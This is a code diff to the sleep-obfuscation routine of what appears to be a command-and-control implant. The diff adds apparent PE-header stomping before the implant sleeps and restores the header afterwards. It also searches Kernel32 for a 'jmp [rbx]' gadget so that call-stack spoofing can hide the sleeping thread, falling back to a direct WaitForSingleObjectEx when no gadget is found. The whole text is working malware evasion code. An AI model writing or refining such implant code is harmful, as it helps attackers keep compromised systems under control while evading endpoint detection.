@@ -2,6 +2,7 @@
 
 #include <common/Macros.h>
 #include <core/SleepObf.h>
+#include <core/PeProtect.h>
 #include <core/Win32.h>
 #include <core/MiniStd.h>
 #include <core/Thread.h>
@@ -136,15 +137,35 @@ VOID SleepObf(
 
         /* default */
         DEFAULT: case SLEEPOBF_NO_OBF: {}; default: {
+            BYTE GadgetPat[] = { 0xFF, 0x23 }; /* jmp [rbx] pattern for callstack spoof */
             PUTS( "SleepObf: dispatch -> WaitForSingleObjectEx (no obfuscation)" )
-            SpoofFunc(
-                Instance->Modules.Kernel32,
-                IMAGE_SIZE( Instance->Modules.Kernel32 ),
-                Instance->Win32.WaitForSingleObjectEx,
-                NtCurrentProcess(),
-                C_PTR( TimeOut ),
-                FALSE
-            );
+            PeProtect_Stomp();
+            /*
+             * Use callstack spoofing only when StackSpoof is configured AND a suitable
+             * jmp [rbx] gadget exists in Kernel32. Falls back to a direct sleep when
+             * StackSpoof is disabled (safe for injected shellcode) or the gadget is absent.
+             */
+            if ( Instance->Config.Implant.StackSpoof &&
+                 MmGadgetFind(
+                     C_PTR( U_PTR( Instance->Modules.Kernel32 ) + LDR_GADGET_HEADER_SIZE ),
+                     IMAGE_SIZE( Instance->Modules.Kernel32 ),
+                     GadgetPat, sizeof( GadgetPat ) ) )
+            {
+                SpoofFunc(
+                    Instance->Modules.Kernel32,
+                    IMAGE_SIZE( Instance->Modules.Kernel32 ),
+                    Instance->Win32.WaitForSingleObjectEx,
+                    NtCurrentProcess(),
+                    C_PTR( TimeOut ),
+                    FALSE
+                );
+            }
+            else
+            {
+                PUTS( "SleepObf: no spoof available, sleeping directly" )
+                Instance->Win32.WaitForSingleObjectEx( NtCurrentProcess(), TimeOut, FALSE );
+            }
+            PeProtect_Restore();
         }
     }
 
